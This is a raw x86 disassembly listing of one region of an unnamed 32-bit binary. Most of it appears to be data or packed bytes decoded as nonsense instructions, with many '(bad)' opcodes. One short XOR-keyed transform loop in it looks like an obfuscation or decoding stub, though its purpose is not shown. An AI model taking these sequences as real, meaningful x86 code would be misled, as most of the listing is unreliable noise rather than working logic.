  4213bb:	icebp  
  4213bc:	or     cl,bh
  4213be:	inc    edx
  4213bf:	inc    edx
  4213c0:	add    eax,0x84d69f46
  4213c5:	pop    edx
  4213c6:	call   0x1e6e:0xc2e51625
  4213cd:	or     eax,0xc90e6730
  4213d2:	ret    
  4213d3:	fild   DWORD PTR [edi-0x1a]
  4213d6:	ins    BYTE PTR es:[edi],dx
  4213d7:	rcr    BYTE PTR es:[ebx-0x11],0x3b
  4213dc:	mov    ah,BYTE PTR [edx-0x727e13cd]
  4213e2:	test   eax,0x137a6e62
  4213e7:	int    0x1a
  4213e9:	(bad)  
  4213ea:	scas   eax,DWORD PTR es:[edi]
  4213eb:	daa    
  4213ec:	rcr    DWORD PTR [ecx],1
  4213ee:	adc    DWORD PTR [edi],ebp
  4213f0:	stc    
  4213f1:	sbb    BYTE PTR [edi-0x68],bl
  4213f4:	xor    ebp,edx
  4213f6:	(bad)  
  4213f7:	loope  0x4213e2
  4213f9:	daa    
  4213fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213fb:	mov    eax,0xc4bde195
  421400:	bound  ecx,QWORD PTR [eax+eiz*1-0x15]
  421404:	pop    es
  421405:	dec    edi
  421406:	cdq    
  421407:	out    dx,eax
  421408:	cwde   
  421409:	jmp    0x928d56b5
  42140e:	xor    eax,0x33084d8b
  421413:	enter  0xce03,0xf
  421417:	test   DWORD PTR [ebx-0x24],esp
  42141a:	(bad)  
  42141b:	(bad)  
  42141c:	jmp    0x421467
  421421:	mov    ecx,DWORD PTR [ebp+0x8]
  421424:	mov    edx,DWORD PTR [ebp-0x8]
  421427:	xor    ecx,eax
  421429:	xor    edx,eax
  42142b:	sub    ecx,edx
  42142d:	sub    ecx,esi
  42142f:	xor    ecx,eax
  421431:	mov    DWORD PTR [ebp+0x8],ecx
  421434:	mov    ecx,DWORD PTR [ebp+0x8]
  421437:	mov    edx,DWORD PTR [ebp+0x8]
  42143a:	xor    ecx,eax
  42143c:	imul   edx,edx,0x5708f5
  421442:	add    ecx,esi
  421444:	lea    ecx,[ebp+ecx*4-0x64]
  421448:	mov    edi,DWORD PTR [ecx]
  42144a:	add    edx,edi
  42144c:	mov    DWORD PTR [ecx],edx
  42144e:	mov    ecx,DWORD PTR [ebp+0x8]
  421451:	xor    ecx,eax
  421453:	add    ecx,esi
  421455:	jne    0x421421
  42145b:	mov    ecx,DWORD PTR [ebp-0x8]
  42145e:	xor    ecx,eax
  421460:	mov    eax,DWORD PTR [ebp+0x10]
  421463:	add    ecx,esi
  421465:	mov    DWORD PTR [eax],ecx
  421467:	pop    edi
  421468:	pop    esi
  421469:	pop    ebx
  42146a:	leave  
  42146b:	ret    0xc
  42146e:	pop    ss
  42146f:	or     al,0x84
  421471:	repz lahf 
  421473:	sti    
  421474:	ja     0x421462
  421476:	stos   BYTE PTR es:[edi],al
  421477:	mov    edx,0xcd8088e2
  42147c:	imul   DWORD PTR [ecx+0x1cd77]
  421482:	pop    esp
  421483:	add    BYTE PTR [eax],al
  421485:	add    BYTE PTR [edi+0x75],al
  421488:	pop    ebx
  421489:	push   ebp
  42148a:	mov    al,ds:0xf724cb43
  42148f:	outs   dx,BYTE PTR ds:[esi]
  421490:	mov    cs:0x80503cb2,al
  421496:	call   FWORD PTR [esi-0x50e5de2d]
  42149c:	sub    al,0x5c
  42149e:	add    BYTE PTR [ebx+0x79],cl
  4214a1:	sbb    cl,BYTE PTR [ecx+0x15]
  4214a4:	mov    ds:0x91612eec,al
  4214a9:	aad    0x5e
  4214ab:	ins    BYTE PTR es:[edi],dx
  4214ac:	pushf  
  4214ad:	inc    esi
  4214ae:	cdq    
  4214af:	add    al,0xb8
  4214b1:	fsubr  DWORD PTR [esi-0x55]
  4214b4:	loopne 0x421504
  4214b6:	dec    edi
  4214b7:	pop    ebx
  4214b8:	fdivr  st,st(3)
  4214ba:	les    ecx,FWORD PTR [edx+0xe46b447]
  4214c0:	mov    ebx,0x2ebfdbd6
  4214c5:	out    0x9e,al
  4214c7:	in     al,dx
  4214c8:	xor    al,0xa1
  4214ca:	sub    al,BYTE PTR [ebx]
  4214cc:	iret   
  4214cd:	push   eax
  4214ce:	gs stos DWORD PTR es:[edi],eax
  4214d0:	push   ebp
  4214d1:	ret    
  4214d2:	out    0x7f,eax
  4214d4:	sti    
  4214d5:	fidivr DWORD PTR [edi+0x4d]
  4214d8:	adc    eax,0xdf2de843
  4214dd:	lea    ecx,[esi-0x1]
  4214e0:	shr    DWORD PTR [ecx+0x0],1
	...
  4214eb:	add    BYTE PTR [eax],al
  4214ed:	add    cl,dl
  4214ef:	sub    al,0x14
  4214f1:	adc    edi,ebp
  4214f3:	cmp    edx,edi
  4214f5:	out    dx,al
  4214f6:	pop    edi
  4214f7:	xchg   bx,ax
  4214f9:	push   0xb911a283
  4214fe:	ror    ebp,cl
  421500:	add    DWORD PTR [eax],eax
  421502:	pop    esp
  421503:	add    BYTE PTR [eax],al
  421505:	add    BYTE PTR [ebp+0x677e16aa],ch
  42150b:	retf   
  42150c:	cmp    dh,BYTE PTR [eax]
  42150e:	and    al,0x5e
  421510:	stos   DWORD PTR es:[edi],eax
  421511:	pop    ss
  421512:	(bad)  
  421513:	inc    edi
  421514:	pop    ebx
  421515:	jg     0x42149a
  421517:	xlat   BYTE PTR ds:[ebx]
  421518:	pushf  
  421519:	adc    ah,cl
  42151b:	push   ds
  42151c:	mov    dh,0xb1
  42151e:	daa    
  42151f:	add    esp,DWORD PTR [ecx+0x2e55d464]
  421525:	xchg   ebx,eax
  421526:	test   eax,0xf2f0ebc9
  42152b:	sub    DWORD PTR [ebx],ecx
  42152d:	push   ebx
  42152e:	mov    ch,0x73
  421530:	stc    
  421531:	lds    eax,FWORD PTR [esi-0x6d6f720c]
  421537:	hlt    
  421538:	shr    DWORD PTR [edi+0x42d71c06],cl
  42153e:	outs   dx,DWORD PTR ds:[esi]
  42153f:	in     eax,0xf7
  421541:	dec    eax
  421542:	xchg   ebx,eax
  421543:	shl    DWORD PTR [edi],0x29
  421546:	cld    
  421547:	cwde   
  421548:	dec    edi
  421549:	cdq    
  42154a:	jge    0x4214f1
  42154c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42154d:	(bad)  
  42154e:	jb     0x42154a
  421550:	add    DWORD PTR [ecx+esi*4-0x45],0x57
  421555:	xlat   BYTE PTR ds:[ebx]
  421556:	dec    eax
  421557:	mov    bh,0xc4
  421559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42155a:	mov    cl,0x43
  42155c:	dec    ebp
  42155d:	sbb    al,al
  42155f:	(bad)  
  421560:	(bad)  
  421561:	jmp    0x0:0x0
  421568:	add    BYTE PTR [eax],al
  42156a:	add    BYTE PTR [eax],al
  42156c:	add    BYTE PTR [eax],al
  42156e:	pop    ds
  42156f:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421575:	sub    eax,esi
  421577:	add    BYTE PTR [edi+eax*2-0x62b2b5ec],0x2f
  42157f:	into   
  421580:	add    DWORD PTR [eax],eax
  421582:	pop    esp
  421583:	add    BYTE PTR [eax],al
  421585:	add    ch,al
  421587:	ss repnz dec ebx
  42158a:	cli    
  42158b:	jecxz  0x421549
  42158d:	dec    esi
  42158e:	jno    0x42151e
  421590:	fld    TBYTE PTR [esi-0x7c]
  421593:	pop    ecx
  421594:	xchg   ebx,eax
  421595:	xor    edx,DWORD PTR [edx-0x35ef6eb2]
  42159b:	push   esi
  42159c:	push   0x6f
  42159e:	(bad)  
  42159f:	ror    BYTE PTR es:[esi-0x6a],1
  4215a3:	enter  0x7cef,0x5a
  4215a7:	loopne 0x42160d
  4215a9:	jns    0x421577
  4215ab:	cdq    
  4215ac:	mov    ds,eax
  4215ae:	dec    edx
  4215af:	mov    edx,DWORD PTR [ecx]
  4215b1:	mov    al,0x6f
  4215b3:	call   0x22889613
  4215b8:	dec    edi
  4215b9:	add    eax,0x8bf43e11
  4215be:	pop    ss
  4215bf:	int    0x3d
  4215c1:	xlat   BYTE PTR ds:[ebx]
  4215c2:	cld    
  4215c3:	push   edx
  4215c4:	pop    ds
  4215c5:	aas    
  4215c6:	in     eax,dx
  4215c7:	jg     0x4215f1
  4215c9:	dec    esi
  4215ca:	call   0x8fa4:0x16931724
  4215d1:	add    BYTE PTR [esi],cl
  4215d3:	mov    ebp,0x6a172b8
  4215d8:	shl    cl,cl
  4215da:	aas    
  4215db:	in     eax,dx
  4215dc:	lds    ecx,FWORD PTR [edx+0x5b]
  4215df:	jecxz  0x42156f
  4215e1:	jns    0x4215e3
	...
  4215eb:	add    BYTE PTR [eax],al
  4215ed:	add    BYTE PTR [edi],ch
  4215ef:	and    al,0xf0
  4215f1:	aam    0xfb
  4215f3:	aam    0x2f
  4215f5:	jmp    FWORD PTR [esi+0x33]
  4215f8:	je     0x4215b0
  4215fa:	test   DWORD PTR [edi-0x44],edx
  4215fd:	and    cl,BYTE PTR [ebx+0x5c0001ce]
  421603:	add    BYTE PTR [eax],al
  421605:	add    BYTE PTR [eax-0x68],bl
  421608:	lods   al,BYTE PTR ds:[esi]
  421609:	data16 or ah,BYTE PTR [edx+0xb671d0]
  421610:	adc    eax,0xf9a7183e
  421615:	aas    
  421616:	vmread ecx,esp
  421619:	push   ebp
  42161a:	and    bh,al
  42161c:	loope  0x42167b
  42161e:	sbb    dl,dl
  421620:	es scas al,BYTE PTR es:[edi]
  421622:	mul    ebp
  421624:	and    eax,0xead1541a
  421629:	stc    
  42162a:	or     al,0xd1
  42162c:	adc    eax,0xb6e0f0fe
  421631:	in     eax,dx
  421632:	inc    ecx
  421633:	imul   DWORD PTR [edx+0x27cd75c1]
  421639:	pop    eax
  42163a:	into   
  42163b:	add    ch,bl
  42163d:	sbb    al,0xed
  42163f:	rcr    BYTE PTR [edx],cl
  421641:	mov    esi,edi
  421643:	into   
  421644:	mov    bh,BYTE PTR [eax-0x4c40db45]
  42164a:	cli    
  42164b:	mov    cl,0xc5
  42164d:	add    al,BYTE PTR [edx]
  42164f:	pop    edx
  421650:	imul   ebx,ebp,0x4e
  421653:	pop    edx
  421654:	mov    al,0xa3
  421656:	cmp    DWORD PTR [edx],0x3f
  421659:	(bad)  
  42165a:	in     al,0x76
  42165c:	mov    cs,ebp
  42165e:	popf   
  42165f:	xor    ah,dl
  421661:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  42166e:	retf   0x76a0
  421671:	dec    ebp
  421672:	jle    0x421653
  421674:	sti    
  421675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421676:	mov    bh,0x83
  421678:	dec    edi
  421679:	mov    ds:0xee2cb4d0,al
  42167e:	out    0xce,eax
  421680:	add    DWORD PTR [eax],eax
  421682:	pop    esp
  421683:	add    BYTE PTR [eax],al
  421685:	add    bh,cl
  421687:	mov    ah,0xf0
  421689:	mov    cl,BYTE PTR [ecx-0x5f02f505]
  42168f:	push   edi
  421690:	or     edi,DWORD PTR [edi-0x4ae9c6f2]
  421696:	fsub   QWORD PTR [ebp-0x32]
  421699:	popa   
  42169a:	aas    
  42169b:	sbb    al,BYTE PTR [ebp-0x53]
  42169e:	push   edx
  42169f:	inc    edi
  4216a0:	cmp    DWORD PTR ds:0x5f0c0ff1,ebx
  4216a6:	sbb    al,BYTE PTR [edx+0x15dbe166]
  4216ac:	lahf   
  4216ad:	test   edi,ecx
  4216af:	call   0xd915623c
  4216b4:	jg     0x421655
  4216b6:	mov    eax,ds:0x69461d29
  4216bb:	inc    eax
  4216bc:	sbb    eax,0x42e036c3
  4216c1:	cld    
  4216c2:	cwde   
  4216c3:	call   0x1f22:0x1c445bc7
  4216ca:	sub    bl,BYTE PTR [eax]
  4216cc:	and    DWORD PTR [ebp+0x31640c3],esp
  4216d2:	sub    al,0xfe
  4216d4:	sub    esi,DWORD PTR [edi-0x76]
  4216d7:	in     al,dx
  4216d8:	pop    ecx
  4216d9:	push   0xbdd2f6ac
  4216de:	mov    ebx,ds
  4216e0:	in     eax,0x8a
	...
  4216ee:	(bad)  
  4216ef:	out    dx,al
  4216f0:	lods   al,BYTE PTR ds:[esi]
  4216f1:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4216f8:	stc    
  4216f9:	stc    
  4216fa:	jbe    0x4216c6
  4216fc:	pushw  ds
  4216fe:	inc    ebx
  4216ff:	iret   
  421700:	add    DWORD PTR [eax],eax
  421702:	pop    esp
  421703:	add    BYTE PTR [eax],al
  421705:	add    BYTE PTR [edi],al
  421707:	aam    0x77
  421709:	test   al,0x92
  42170b:	(bad)  
  42170c:	push   ecx
  42170d:	std    
  42170e:	in     eax,0x3d
  421710:	ret    0xb394
  421713:	pushf  
  421714:	adc    DWORD PTR [ebx-0x8],esi
  421717:	aaa    
  421718:	cld    
  421719:	sub    DWORD PTR [ebp-0x29],ecx
  42171c:	xchg   edi,eax
  42171d:	mov    ebp,0xbbdffcf0
  421722:	cmp    al,0x58
  421724:	or     bl,bl
  421726:	icebp  
  421727:	xchg   ecx,eax
  421728:	lods   al,BYTE PTR ds:[esi]
  421729:	sahf   
  42172a:	push   0xffffffa5
  42172c:	jb     0x4216de
  42172e:	xchg   ecx,eax
  42172f:	fcmovb st,st(5)
  421731:	xchg   edi,eax
  421732:	cmc    
  421733:	in     al,0x6c
  421735:	xlat   BYTE PTR ds:[ebx]
  421736:	jns    0x4217b2
  421738:	adc    DWORD PTR [ebp+0x6104cee0],ebp
  42173e:	int    0x4a
  421740:	sbb    BYTE PTR [ecx],ah
  421742:	inc    esp
  421743:	es jns 0x421783
  421746:	lock xor esp,DWORD PTR [esi+0x3e]
  42174a:	mov    al,ds:0x3558d060
  42174f:	and    BYTE PTR [ebx],0x8f
  421752:	fs sub eax,esi
  421755:	lods   eax,DWORD PTR ds:[esi]
  421756:	mov    dh,0xe4
  421758:	imul   ebp,DWORD PTR [esi-0x24b67f88],0x5fe1fa33
	...
  42176e:	push   edx
  42176f:	xor    al,0x40
  421771:	gs data16 jne 0x4217ec
  421775:	aaa    
  421776:	push   0x276a4e09
  42177b:	push   edx
  42177c:	fsubr  st(6),st
  42177e:	lahf   
  42177f:	iret   
  421780:	add    DWORD PTR [eax],eax
  421782:	pop    esp
  421783:	add    BYTE PTR [eax],al
  421785:	add    BYTE PTR [ecx],bl
  421787:	push   0x5cf8c9da
  42178c:	mov    esp,0x4a7ad22e
  421791:	jle    0x421713
  421793:	stos   BYTE PTR es:[edi],al
  421794:	pop    ds
  421795:	mov    al,ds:0xb047c6c2
  42179a:	jl     0x4217b7
  42179c:	mov    ecx,0xff361800
  4217a1:	xor    al,0xea
  4217a3:	stos   BYTE PTR es:[edi],al
  4217a4:	jmp    0x20fc:0x686a18d8
  4217ab:	pushf  
  4217ac:	fucomip st,st(1)
  4217ae:	add    eax,0xa37f3466
  4217b3:	jne    0x421796
  4217b5:	daa    
  4217b6:	dec    esi
  4217b7:	lods   eax,DWORD PTR ds:[esi]
  4217b8:	push   eax
  4217b9:	jl     0x4217ee
  4217bb:	pop    ds
  4217bc:	sbb    edi,esp
  4217be:	gs stos BYTE PTR es:[edi],al
  4217c0:	xchg   edx,eax
  4217c1:	in     eax,dx
  4217c2:	cmp    ch,BYTE PTR [edi]
  4217c4:	or     al,0x16
  4217c6:	dec    BYTE PTR [esi-0x11]
  4217c9:	sub    BYTE PTR [edx+0x732c807b],bl
  4217cf:	dec    ebp
  4217d0:	pop    es
  4217d1:	add    al,0x69
  4217d3:	(bad)  
  4217d4:	push   ebx
  4217d5:	aaa    
  4217d6:	stos   BYTE PTR es:[edi],al
  4217d7:	dec    esp
  4217d8:	test   DWORD PTR [eax+0x23],esp
  4217db:	pushf  
  4217dc:	push   ss
  4217dd:	mov    edi,0x16c01425
	...
  4217ee:	adc    bh,BYTE PTR [edx-0x19073928]
  4217f4:	push   ds
  4217f5:	(bad)  
  4217f6:	adc    bl,dh
  4217f8:	cwde   
  4217f9:	out    dx,al
  4217fa:	mov    al,0x6f
  4217fc:	loope  0x4217e3
  4217fe:	cmp    esp,ecx
  421800:	add    DWORD PTR [eax],eax
  421802:	pop    esp
  421803:	add    BYTE PTR [eax],al
  421805:	add    al,ch
  421807:	aad    0x94
  421809:	and    BYTE PTR [esi-0x1aed1689],bh
  42180f:	sbb    ch,BYTE PTR cs:[ebp-0x22]
  421813:	pop    ebp
  421814:	in     al,0x8e
  421816:	icebp  
  421817:	shl    DWORD PTR [edi-0x6b3d84ee],0x78
  42181e:	sub    ch,ch
  421820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421821:	sahf   
  421822:	mov    ecx,0xe3c3dd76
  421827:	xchg   ecx,eax
  421828:	icebp  
  421829:	adc    al,0x1e
  42182b:	icebp  
  42182c:	mov    ebx,DWORD PTR [ecx*1+0x5c50f500]
  421833:	in     eax,dx
  421834:	mov    al,ds:0x564bf1c
  421839:	add    BYTE PTR [eax+edx*1-0x78],ch
  42183d:	xchg   ebp,eax
  42183e:	and    eax,0xadcb74b8
  421843:	mov    edi,DWORD PTR [ecx+0x4d039bbb]
  421849:	aad    0x39
  42184b:	loop   0x42189c
  42184d:	dec    edi
  42184e:	add    DWORD PTR ds:0x7fa09063,0x53
  421855:	pop    edx
  421856:	popa   
  421857:	gs mov esp,0xc604de6e
  42185d:	mov    ch,0x9
  42185f:	arpl   bx,cx
  421861:	push   edi
	...
  42186e:	dec    ecx
  42186f:	inc    esi
  421870:	sub    BYTE PTR [eax],dh
  421872:	das    
  421873:	jle    0x4218ce
  421875:	jg     0x42183d
  421877:	imul   esi,eax,0xffffffd5
  42187a:	pop    ds
  42187b:	rol    BYTE PTR [edi-0x6f],cl
  42187e:	xchg   edi,eax
  42187f:	loope  0x421882
  421881:	add    BYTE PTR [eax+eax*1+0x0],bl
  421885:	add    dh,al
  421887:	ins    DWORD PTR es:[di],dx
  421889:	adc    cl,BYTE PTR ds:0x84a23ec7
  42188f:	add    ebx,DWORD PTR [ecx]
  421891:	inc    edi
  421892:	adc    al,0x95
  421894:	cwde   
  421895:	cs scas eax,DWORD PTR es:[edi]
  421897:	ror    BYTE PTR [ecx-0x395386c9],cl
  42189d:	ret    0xe78
  4218a0:	call   0x1ea27ebe
  4218a5:	out    dx,eax
  4218a6:	mov    edi,0x3b661d89
  4218ab:	push   ecx
  4218ac:	inc    edx
  4218ad:	push   esp
  4218ae:	sahf   
  4218af:	retf   0x9d8d
  4218b2:	inc    esp
  4218b3:	into   
  4218b4:	mov    ebp,DWORD PTR [edi+0x64]
  4218b7:	add    eax,0x3408514
  4218bc:	pop    esi
  4218bd:	jp     0x4218eb
  4218bf:	js     0x4218e1
  4218c1:	pusha  
  4218c2:	dec    eax
  4218c3:	call   0xe8b9aedd
  4218c8:	stc    
  4218c9:	scas   eax,DWORD PTR es:[edi]
  4218ca:	sbb    esi,DWORD PTR [edi]
  4218cc:	sub    esi,DWORD PTR [edx+0x40b8b469]
  4218d2:	dec    esp
  4218d3:	sub    esp,DWORD PTR [ebp-0xf]
  4218d6:	dec    esi
  4218d7:	(bad)  
  4218d8:	fwait
  4218d9:	jbe    0x42193b
  4218db:	cmp    BYTE PTR [esi-0x52359342],dh
  4218e1:	mov    bl,0x0
	...
  4218eb:	add    BYTE PTR [eax],al
  4218ed:	add    BYTE PTR [edi-0x3a],ah
  4218f0:	and    dh,dh
  4218f2:	mov    eax,ds:0xe7d7f7f6
  4218f7:	mov    eax,0x5b54da72
  4218fc:	addr16 dec esp
  4218fe:	repz loope 0x421902
  421901:	add    BYTE PTR [eax+eax*1+0x0],bl
  421905:	add    BYTE PTR [ecx+ecx*8],al
  421908:	aad    0x78
  42190a:	mul    bl
  42190c:	push   0x8
  42190e:	mov    eax,0xa60163d7
  421913:	arpl   WORD PTR [edx-0x667978ba],di
  421919:	hlt    
  42191a:	ja     0x4218ab
  42191c:	pusha  
  42191d:	fdiv   st(4),st
  42191f:	dec    esi
  421920:	cmp    al,0x2e
  421922:	leave  
  421923:	cmp    DWORD PTR gs:[ebp+ecx*2+0x6a83c98a],0xffffffd3
  42192c:	imul   edx,ebx,0x1b33e956
  421932:	pop    ds
  421933:	ror    DWORD PTR [edi+0xe3f1b71],cl
  421939:	test   BYTE PTR [ecx-0x7080ac37],dl
  42193f:	xor    DWORD PTR [edi-0x5d],edx
  421942:	xor    bl,cl
  421944:	and    al,0x75
  421946:	adc    bh,dl
  421948:	out    dx,eax
  421949:	and    DWORD PTR [esi+0x59],ebp
  42194c:	or     DWORD PTR [eax-0xa],edx
  42194f:	in     al,dx
  421950:	and    dh,bl
  421952:	in     eax,dx
  421953:	push   ebx
  421954:	jge    0x42197f
  421956:	retf   0x8e66
  421959:	(bad)  
  42195a:	mov    ebp,0x5b440ad
  42195f:	or     ah,dl
  421961:	mov    al,ds:0x0
	...
  42196e:	ret    
  42196f:	or     eax,0xefee66a6
  421974:	ret    
  421975:	lods   eax,DWORD PTR ds:[esi]
  421976:	sub    al,0xb8
  421978:	mov    ds:0x30490647,eax
  42197d:	test   eax,0x1e24f
  421982:	pop    esp
  421983:	add    BYTE PTR [eax],al
  421985:	add    BYTE PTR [edi+0x7e47cb56],ah
  42198b:	imul   eax,esp,0xf2ac7cd7
  421991:	pop    ds
  421992:	repz mov ebx,DWORD PTR [ecx]
  421995:	push   edx
  421996:	in     al,dx
  421997:	into   
  421998:	xor    eax,0x6e668823
  42199d:	stc    
  42199e:	pop    ecx
  42199f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219a0:	jnp    0x42192e
  4219a2:	(bad)  
  4219a3:	pop    ecx
  4219a4:	leave  
  4219a5:	adc    DWORD PTR [ecx+0x3],ebx
  4219a8:	inc    esi
  4219a9:	sub    ah,BYTE PTR [ebx-0x766db68c]
  4219af:	mov    al,ds:0x7bda06ac
  4219b4:	push   cs
  4219b5:	rcl    BYTE PTR [eax],0x4f
  4219b8:	or     BYTE PTR [ebx],al
  4219ba:	std    
  4219bb:	xchg   edx,eax
  4219bc:	xchg   edx,eax
  4219bd:	call   0xbb063063
  4219c2:	dec    esp
  4219c3:	sbb    BYTE PTR [edx+0x45c2339a],al
  4219c9:	lock mov dh,0xda
  4219cc:	xor    ecx,ecx
  4219ce:	xchg   ebp,eax
  4219cf:	sbb    dh,0x51
  4219d2:	jo     0x4219b5
  4219d4:	mov    cl,0x38
  4219d6:	ins    DWORD PTR es:[edi],dx
  4219d7:	or     eax,DWORD PTR ds:0xd25dcf3b
  4219dd:	sbb    BYTE PTR [edx],ah
  4219df:	mov    al,0x4d
  4219e1:	in     al,0x0
	...
  4219eb:	add    BYTE PTR [eax],al
  4219ed:	add    cl,bl
  4219ef:	ret    0x4905
  4219f2:	pop    ds
  4219f3:	iret   
  4219f4:	fst    st(2)
  4219f6:	enter  0xf86f,0xd2
  4219fa:	test   eax,0xab9a5c36
  4219ff:	loop   0x421a02
  421a01:	add    BYTE PTR [eax+eax*1+0x0],al
  421a05:	add    BYTE PTR [ebx+0x3cea845],cl
  421a0b:	adc    eax,0x69ebb758
  421a10:	lahf   
  421a11:	adc    al,0x4c
  421a13:	add    eax,0x53a453b8
  421a18:	aad    0xf3
  421a1a:	add    edx,edx
  421a1c:	clc    
  421a1d:	sub    esi,DWORD PTR [edx]
  421a1f:	or     DWORD PTR [edi+0x407eee0c],ebx
  421a25:	sbb    eax,0xcff3c9d3
  421a2a:	test   BYTE PTR [ebx+0x5b],al
  421a2d:	lea    edi,[ebx+0x5dcb0dce]
  421a33:	inc    ecx
  421a34:	mov    edi,0x84a06ea6
  421a39:	adc    dh,BYTE PTR [edi+0x5f]
  421a3c:	inc    edi
  421a3d:	mov    ebx,0x83c8077
  421a42:	mov    edi,0xe36a0e75
  421a47:	push   edi
  421a48:	mov    al,0xf
  421a4a:	add    BYTE PTR [eax],al
  421a4c:	add    BYTE PTR [eax],al
  421a4e:	add    BYTE PTR [eax-0x6ffbffbe],dl
  421a54:	inc    edx
  421a55:	add    BYTE PTR [eax],cl
  421a57:	nop
  421a58:	inc    edx
  421a59:	add    BYTE PTR [eax+edx*4],cl
  421a5c:	inc    edx
  421a5d:	add    BYTE PTR [eax],dl
  421a5f:	nop
  421a60:	inc    edx
  421a61:	add    BYTE PTR [eax+edx*4],dl
  421a64:	inc    edx
  421a65:	add    BYTE PTR [eax],bl
  421a67:	nop
  421a68:	inc    edx
  421a69:	add    BYTE PTR [eax+edx*4],bl
  421a6c:	inc    edx
  421a6d:	add    BYTE PTR [eax],al
  421a6f:	mov    al,ds:0xa0040042
  421a74:	inc    edx
  421a75:	add    BYTE PTR [eax],cl
  421a77:	mov    al,ds:0xa00c0042
  421a7c:	inc    edx
  421a7d:	add    BYTE PTR [eax],dl
  421a7f:	mov    al,ds:0xa0140042
  421a84:	inc    edx
  421a85:	add    BYTE PTR [eax],bl
  421a87:	mov    al,ds:0xa01c0042
  421a8c:	inc    edx
  421a8d:	add    BYTE PTR [eax],al
  421a8f:	mov    al,0x42
  421a91:	add    BYTE PTR [eax+esi*4],al
  421a94:	inc    edx
  421a95:	add    BYTE PTR [eax],cl
  421a97:	mov    al,0x42
  421a99:	add    BYTE PTR [eax+esi*4],cl
  421a9c:	inc    edx
  421a9d:	add    BYTE PTR [eax],dl
  421a9f:	mov    al,0x42
  421aa1:	add    BYTE PTR [eax+esi*4],dl
  421aa4:	inc    edx
  421aa5:	add    BYTE PTR [eax],bl
  421aa7:	mov    al,0x42
  421aa9:	add    BYTE PTR [eax+esi*4],bl
  421aac:	inc    edx
  421aad:	add    BYTE PTR [eax+0x66],bh
  421ab0:	ins    BYTE PTR es:[edi],dx
  421ab1:	jp     0x421b0a
  421ab3:	jbe    0x421afc
  421ab5:	ja     0x421afa
  421ab7:	js     0x421b01
  421ab9:	jno    0x421b1e
  421abb:	inc    edx
  421abc:	inc    bx
  421abe:	push   ebp
  421abf:	jno    0x421b37
  421ac1:	ja     0x421b2a
  421ac3:	dec    edi
  421ac4:	dec    esp
  421ac5:	dec    ebp
  421ac6:	inc    edx
  421ac7:	jno    0x421b3a
  421ac9:	jae    0x421b1e
  421acb:	push   eax
  421acc:	arpl   WORD PTR [ebx+0x76],dx
  421acf:	push   ds
  421ad0:	inc    edx
  421ad1:	add    BYTE PTR [esi+0x1e],bh
  421ad4:	inc    edx
  421ad5:	add    BYTE PTR [esi],dl
  421ad7:	sbb    eax,0xbef0042
  421adc:	mov    dl,0xe
  421ade:	jns    0x421b2e
  421ae0:	xor    BYTE PTR [esi-0x79],cl
  421ae3:	dec    edi
  421ae4:	cmp    eax,0x3e4faf4e
  421ae9:	dec    esi
  421aea:	js     0x421b3a
  421aec:	cmp    ecx,DWORD PTR [esi-0x64]
  421aef:	dec    edi
  421af0:	inc    esp
  421af1:	dec    esi
  421af2:	jae    0x421b42
  421af4:	inc    ecx
  421af5:	dec    esi
  421af6:	xor    BYTE PTR [esi+0x40],cl
  421af9:	dec    esi
  421afa:	pop    esp
  421afb:	pop    ebp
  421afc:	pop    edi
  421afd:	push   edx
  421afe:	cmp    DWORD PTR [esi+0x79],ecx
  421b01:	dec    esi
  421b02:	xor    BYTE PTR [esi-0x79],cl
  421b05:	dec    edi
  421b06:	cmp    eax,0x3e4faf4e
  421b0b:	dec    esi
  421b0c:	js     0x421b5c
  421b0e:	cmp    ecx,DWORD PTR [esi-0x64]
  421b11:	dec    edi
  421b12:	inc    esp
  421b13:	dec    esi
  421b14:	mov    DWORD PTR [edi+0x41],ecx
  421b17:	dec    esi
  421b18:	xor    BYTE PTR [esi+0x40],cl
  421b1b:	dec    esi
  421b1c:	pop    esp
  421b1d:	ins    DWORD PTR es:[edi],dx
  421b1e:	pop    edi
  421b1f:	bound  edi,QWORD PTR [ecx]
  421b21:	dec    esi
  421b22:	jns    0x421b72
  421b24:	xor    BYTE PTR [esi-0x80],cl
  421b27:	dec    edi
  421b28:	cmp    eax,0x394e734e
  421b2d:	dec    esi
  421b2e:	mov    ds:0x304e3a4f,al
  421b33:	dec    esi
  421b34:	inc    esi
  421b35:	dec    esi
  421b36:	pop    esp
  421b37:	jge    0x421b98
  421b39:	jb     0x421baa
  421b3b:	sub    BYTE PTR [esi-0x7d],0x7e
  421b3f:	xchg   ebx,eax
  421b40:	jns    0x421ad2
  421b42:	aas    
  421b43:	dec    esi
  421b44:	test   BYTE PTR [edi+0x30],cl
  421b47:	dec    esi
  421b48:	test   BYTE PTR [edi+0x3c],cl
  421b4b:	dec    esi
  421b4c:	mov    ds:0x734e394f,al
  421b51:	dec    esi
  421b52:	inc    ebp
  421b53:	dec    esi
  421b54:	xor    BYTE PTR [esi+0x44],cl
  421b57:	dec    esi
  421b58:	pop    esp
  421b59:	lea    ebx,[edi-0x7e]
  421b5c:	outs   dx,DWORD PTR ds:[esi]
  421b5d:	xchg   edx,eax
  421b5e:	outs   dx,BYTE PTR ds:[esi]
  421b5f:	xchg   ebx,eax
  421b60:	jle    0x421b05
  421b62:	jns    0x421b04
  421b64:	aas    
  421b65:	dec    esi
  421b66:	test   BYTE PTR [edi+0x30],cl
  421b69:	dec    esi
  421b6a:	test   BYTE PTR [edi+0x3c],cl
  421b6d:	dec    esi
  421b6e:	mov    ds:0x894e394f,al
  421b73:	dec    edi
  421b74:	inc    ebp
  421b75:	dec    esi
  421b76:	xor    BYTE PTR [esi+0x44],cl
  421b79:	dec    esi
  421b7a:	pop    esp
  421b7b:	popf   
  421b7c:	pop    edi
  421b7d:	xchg   edx,eax
  421b7e:	outs   dx,DWORD PTR ds:[esi]
  421b7f:	mov    ds:0xb37ea36e,al
  421b84:	jns    0x421b36
  421b86:	aas    
  421b87:	dec    esi
  421b88:	mov    cs,WORD PTR [edi+0x30]
  421b8b:	dec    esi
  421b8c:	lods   al,BYTE PTR ds:[esi]
